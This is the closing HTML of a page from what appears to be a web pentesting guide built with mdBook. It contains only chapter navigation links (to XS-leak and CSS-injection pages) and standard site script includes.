                    <a rel="prev" href="../../../pentesting-web/xs-search/javascript-execution-xs-leak.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/xs-search/css-injection/css-injection-code.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
